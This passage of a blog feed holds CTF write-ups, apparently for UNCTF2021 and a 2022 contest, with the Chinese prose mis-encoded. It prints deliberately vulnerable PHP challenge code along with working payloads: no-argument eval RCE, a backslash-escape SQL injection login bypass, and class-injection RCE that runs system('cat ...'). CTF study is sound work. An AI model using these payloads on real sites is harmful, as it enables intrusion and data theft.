class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading, time</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">f = [BitVec(<span class="string">f&#x27;flag<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">flag = f[:]</span><br><span class="line">x = Solver()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_1</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ num</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_2</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">global</span> num</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= <span class="number">0</span>:</span><br><span class="line">            flag[num] = flag[num] ^ flag[(num + <span class="number">1</span>)]</span><br><span class="line">            num -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> num &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    Happy = [<span class="number">44</span>, <span class="number">100</span>, <span class="number">3</span>, <span class="number">50</span>, <span class="number">106</span>, <span class="number">90</span>, <span class="number">5</span>, <span class="number">102</span>, <span class="number">10</span>, <span class="number">112</span>]</span><br><span class="line">    num = <span class="number">9</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    t1 = threading.Thread(target=encode_1, args=(<span class="number">1</span>, ))</span><br><span class="line">    t2 = threading.Thread(target=encode_2, args=(<span class="number">2</span>, ))</span><br><span class="line">    t1.start()</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    t2.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        x.add(flag[k]==Happy[k])</span><br><span class="line">    <span class="keyword">if</span> x.check() == sat:</span><br><span class="line">        m = x.model()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(m[f[i]].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(f))]))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># He110_cazy</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>flag&#123;He110_cazy&#125;</code></p><p>â€‹    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="RCE-No-Para"><a href="#RCE-No-Para" class="headerlink" title="RCE_No_Para"></a>RCE_No_Para</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>ç¬¬ä¸€å±‚æ­£åˆ™è¡¨è¾¾å¼ä¸ºé€’å½’åŒ¹é…åªå«å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿çš„æ— å‚å‡½æ•°ï¼Œå¦‚ <code>a(b_c());</code>ï¼Œç¬¬äºŒå±‚è¦æ±‚ä¸èƒ½åŒ…å« <code>session|end|next|header|dir</code> å…³é”®å­—ï¼Œä½¿ç”¨ <code>get_defined_vars()</code> å¯ä»è¯·æ±‚ä¸­å‘ <code>$_GET</code> ä¼ å…¥æ‰€éœ€æ‰§è¡Œçš„å‡½æ•°ï¼Œç”±äº <code>end</code> å’Œ <code>next</code> ä¸èƒ½ä½¿ç”¨ï¼Œå¯ä½¿ç”¨ <code>reset</code> å’Œ <code>array_reverse</code> è°ƒæ•´æ•°ç»„ä¸å–å€¼ï¼Œå†åˆ©ç”¨ <code>eval</code> å‘½ä»¤æ‰§è¡Œã€‚</p><p>payloadï¼š<code>?code=eval(reset(array_reverse(current(get_defined_vars()))));&amp;b=system(&quot;cat%20flag.php&quot;);</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;æ–°å† ç–«æƒ…è‚†è™å…¨çƒï¼Œè¿™ä¸€åœºç–«æƒ…é˜»å‡»æˆ˜ä¸ä»…æ˜¯æˆ‘å›½å«ç”Ÿå¥åº·é¢†åŸŸçš„ä¸€åœºæˆ˜ç–«ï¼Œä¹Ÿæ˜¯ç§‘å­¦æŠ€æœ¯é¢†åŸŸçš„ä¸€æ¬¡å¤§è€ƒã€‚åœ¨è¿™ä¸ªç‰¹æ®Šæ—¶æœŸï¼Œä¿éšœç½‘ç»œå®‰å…¨ï¼Œé˜²èŒƒåˆ©ç”¨æ–°å† è‚ºç‚ç–«æƒ…å®æ–½çš„ç½‘ç»œæ”»å‡»è¡Œä¸ºæ˜¯å…³ç³»å¹¿å¤§äººæ°‘ç¾¤ä¼—åˆ‡èº«åˆ©ç›Šçš„å¤§äº‹ã€‚å¦‚ç½‘ç»œæ”»å‡»è€…å°†è®¡ç®—æœºç—…æ¯’ã€æœ¨é©¬å’Œç§»åŠ¨æ¶æ„ç¨‹åºç­‰ä¼ªè£…</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022èµ›" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>UNCTF2021-å…¬å¼€èµ›</title>
    <link href="https://lazzzaro.github.io/2021/12/07/match-UNCTF2021%E5%85%AC%E5%BC%80%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2021/12/07/match-UNCTF2021%E5%85%AC%E5%BC%80%E8%B5%9B/</id>
    <published>2021-12-07T11:44:54.000Z</published>
    <updated>2021-12-07T16:08:16.383Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>ä¸ºå“åº”å›½å®¶é€‰æ‹”ã€æ¨èä¼˜ç§€ç½‘ç»œç©ºé—´å®‰å…¨ä¸“ä¸šäººæ‰ï¼ŒåŸ¹å…»å­¦ç”Ÿçš„åˆ›æ–°æ„è¯†ä¸å›¢é˜Ÿåˆä½œç²¾ç¥ï¼Œæé«˜å¤§å­¦ç”Ÿçš„ç½‘ç»œå®‰å…¨æŠ€æœ¯æ°´å¹³ã€åˆ›æ–°å®è·µä¸ç»¼åˆè®¾è®¡èƒ½åŠ›ï¼Œæ¨åŠ¨æˆ‘å›½é«˜æ ¡ç½‘ç»œç©ºé—´å®‰å…¨ä¸“ä¸šå»ºè®¾ä¸æ”¹é©ï¼Œå…¨å›½9æ‰€é«˜æ ¡ï¼ˆé—½å—å¸ˆèŒƒå¤§å­¦ï¼Œç¦å·å¤§å­¦è‡³è¯šå­¦é™¢ï¼Œé‡åº†å¤§å­¦ï¼Œé™†å†›å·¥ç¨‹å¤§å­¦ï¼Œå—äº¬èˆªç©ºèˆªå¤©å¤§å­¦ï¼Œé‡‘é™µç§‘æŠ€å­¦é™¢ï¼Œè¥¿åå¤§å­¦ï¼Œæµ™æ±Ÿå¸ˆèŒƒå¤§å­¦ï¼Œå¦é—¨ç†å·¥å¤§å­¦ï¼‰å†³å®šç»„æˆè”åˆæ‹›æ–°èµ›ï¼Œç§‰ç€å…¬å¹³ï¼Œå…¬æ­£ï¼Œå…¬å¼€çš„åŸåˆ™ä¸ºæœ¬é«˜æ ¡é€‰æ‹”ç½‘ç»œç©ºé—´å®‰å…¨ä¸“ä¸šäººæ‰ã€‚</p><p>ç«èµ›æ—¶é—´</p><p>2021å¹´11æœˆ28æ—¥-2021å¹´12æœˆ6æ—¥</p><p>ç«èµ›å¹³å°</p><p>è‡ªç ”å¹³å°ï¼Œå¹³å°åœ°å€ï¼š<a href="https://ctf.unctf.com/">https://ctf.unctf.com/</a></p><p><strong>Rank: 1</strong></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="# Web"></a># Web</h2><h3 id="fuzz-md5"><a href="#fuzz-md5" class="headerlink" title="fuzz_md5"></a>fuzz_md5</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_GET</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>];</span><br><span class="line"><span class="variable">$pass2</span>=md5(<span class="variable">$pass</span>);</span><br><span class="line"><span class="variable">$pass3</span>=substr(<span class="variable">$pass2</span>, <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line"><span class="variable">$a</span>=preg_replace(<span class="string">&quot;/unctf/i&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>===<span class="string">&quot;unctf&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pass3</span>===<span class="string">&quot;66666&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;welcome to unctf~&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;welcome to unctf~~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p><code>user</code> å‚æ•°å€¼åŒå†™ç»•è¿‡ï¼Œ<code>pass</code> å‚æ•°å€¼çˆ†ç ´ç¬¦åˆå‰5ä½æ˜¯66666çš„MD5ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):</span><br><span class="line">    x = md5(<span class="built_in">str</span>(i).encode()).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> x.startswith(<span class="string">&#x27;66666&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1004649</span></span><br></pre></td></tr></table></figure><p>Payloadï¼š<code>http://xxx/?user=ununctfctf</code>ï¼ŒPOSTä¼ å‚ <code>pass=1004649</code>ã€‚</p><p>flagï¼š<code>UNCTF&#123;13875534-9edb-4e2b-b51c-b18091ca1284&#125;</code></p><p>â€‹    </p><h3 id="can-you-hacked-me"><a href="#can-you-hacked-me" class="headerlink" title="can_you_hacked_me"></a>can_you_hacked_me</h3><blockquote><p>å¸¦é»‘é˜”ï¼Œä½ èƒ½æŠŠæˆ‘éª‡å’¯ï¼Ÿ</p></blockquote><p><code>www.zip</code> å¾—åˆ°æºç ã€‚</p><p><code>index.php</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Can You Hacked me?&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Can You Hacked me?&lt;/h1&gt;</span><br><span class="line">&lt;form method=&quot;get&quot;&gt;</span><br><span class="line">    Username: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt; &lt;br&gt;</span><br><span class="line">    Password: &lt;input type=&quot;text&quot; name=&quot;password&quot;&gt; &lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function waf1($inject) &#123;</span><br><span class="line">    preg_match(&quot;/&#x27;|union|select|&amp;|\||and|or|\(|,/i&quot;,$inject) &amp;&amp; die(&#x27;return preg_match(&quot;/\&#x27;|union|select|&amp;|\\||and|or|(|,/i&quot;,$inject);&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;])) &#123;</span><br><span class="line">    $username = $_GET[&#x27;username&#x27;];</span><br><span class="line">    $password = $_GET[&#x27;password&#x27;];</span><br><span class="line">    </span><br><span class="line">    waf1($username) || waf1($password);</span><br><span class="line">    </span><br><span class="line">    if (strtolower($_GET[&#x27;username&#x27;]) == &#x27;admin&#x27; &amp;&amp; $_SERVER[&quot;REMOTE_ADDR&quot;] != &#x27;127.0.0.1&#x27;) &#123;</span><br><span class="line">        die(&#x27;Admin only allow to login at localhost&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $conn = new mysqli(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;root&quot;,&quot;supersqli&quot;);</span><br><span class="line">    </span><br><span class="line">    $sql = &quot;select * from `users` where username = &#x27;$username&#x27; and password = &#x27;$password&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    </span><br><span class="line">    echo $sql . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">    </span><br><span class="line">    if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">        // è¾“å‡ºæ•°æ®</span><br><span class="line">        while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">            if($row[&quot;username&quot;] === &#x27;admin&#x27;) &#123;</span><br><span class="line">                echo &#x27;Welcome Admin, here is your flag: &#x27; . $flag;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                die(&quot;You are not Admin.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Result Not Found!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $conn-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><code>db.sql</code>ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> supersqli;</span><br><span class="line"></span><br><span class="line">USE supersqli;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> `users` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `username` <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `password` <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">) ENGINE<span class="operator">=</span>MyISAM  <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;test&#x27;</span>),(<span class="number">2</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;AdminSecret&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ç¦ç”¨çš„å…³é”®å­—ä½¿å¾—éš¾ä»¥è¿›è¡Œå¸¸è§„æ³¨å…¥ï¼Œè€ƒè™‘è®©whereæ¡ä»¶æ’çœŸï¼Œ<code>username</code> ä¼ å…¥ <code>\</code> è½¬ä¹‰åå•å¼•å·ï¼Œä½¿ <code>username</code> çš„å€¼ä¸º <code>&#39; and password =</code>ï¼Œ<code>password</code> ä¼ å…¥å¼‚æˆ–æ“ä½œï¼Œä½¿æ€»æ¡ä»¶æ’çœŸï¼Œå†ç­›é€‰å‡ºç¬¬äºŒæ¡æ•°æ®å³å¯è®©æŸ¥è¯¢ç»“æœä¸º <code>admin</code>ã€‚</p><p>Payloadï¼š</p><p><code>http://xxx/?username=\&amp;password=^0 limit 2 offset 1 --+</code></p><p>flagï¼š<code>UNCTF&#123;3abc4508-17c4-488e-9b2b-3fa11fee771c&#125;</code></p><p>â€‹    </p><h3 id="phpmysql"><a href="#phpmysql" class="headerlink" title="phpmysql"></a>phpmysql</h3><blockquote><p>ä½ äº†è§£flagå—?åœ¨æ ¹ç›®å½•å“¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;æ¬¢è¿æ¥åˆ°unctf2021ï¼Œhave fun&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$db_host</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="variable">$db_user</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$db_pwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line"><span class="variable">$db_port</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$db_host</span>==<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;æ•°æ®åº“åœ°å€ä¸èƒ½ä¸ºç©ºï¼&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$db_host</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;fakeflag is /flag&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/;|\||&amp;/is&quot;</span>,<span class="variable">$db_user</span>) || preg_match(<span class="string">&quot;/;|\||&amp;/is&quot;</span>,<span class="variable">$db_pwd</span>) || preg_match(<span class="string">&quot;/;|\||&amp;/is&quot;</span>,<span class="variable">$db_port</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å˜‰ç„¶ä»Šå¤©åƒä»€ä¹ˆ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;mysql -h <span class="subst">$db_host</span> -u <span class="subst">$db_user</span> -p <span class="subst">$db_pwd</span> -P <span class="subst">$db_port</span> --enable-local-infile&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;Maybe you can do someting else&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$db_user</span>) || !<span class="keyword">isset</span>(<span class="variable">$db_pwd</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo new Exception(\&quot;&lt;script&gt;alert(&#x27;å…³æ³¨å˜‰ç„¶ï¼Œé¡¿é¡¿è§£é¦‹ï¼ï¼ï¼&#x27;);&lt;/script&gt;\&quot;);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$db_user</span> = str_ireplace(<span class="string">&quot;SplFileObject&quot;</span>, <span class="string">&quot;UNCTF2021&quot;</span>, <span class="variable">$db_user</span>);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$db_user</span>(<span class="subst">$db_pwd</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></blockquote><p>åˆ©ç”¨æœ€å <code>eval(&quot;echo new $db_user($db_pwd);&quot;);</code> çš„æ‹¼æ¥ç‰¹æ€§ï¼Œç”¨ç±» <code>DirectoryIterator</code> åˆ—ç›®å½•åï¼Œå†RCEã€‚</p><p>Payloadï¼š</p><p>POSTä¼ å‚ <code>host=x&amp;pwd=y&amp;port=z&amp;user=DirectoryIterator(&quot;glob:///*&quot;);system(&quot;cat /fllllaaaaag&quot;);//</code></p><p>â€‹    </p><h3 id="babywrite"><a href="#babywrite" class="headerlink" title="babywrite"></a>babywrite</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$sandbox</span> = md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!is_dir(<span class="variable">$sandbox</span>)) &#123;</span><br><span class="line">    mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match_all(<span class="string">&quot;/ph|\.\.|\//i&quot;</span>, <span class="variable">$filename</span>) || strlen(<span class="variable">$filename</span>) &gt; <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No way!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match_all(<span class="string">&quot;/&lt;\?|ph/&quot;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No way!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$sandbox</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$filename</span>;</span><br><span class="line">    @file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>ä¼ 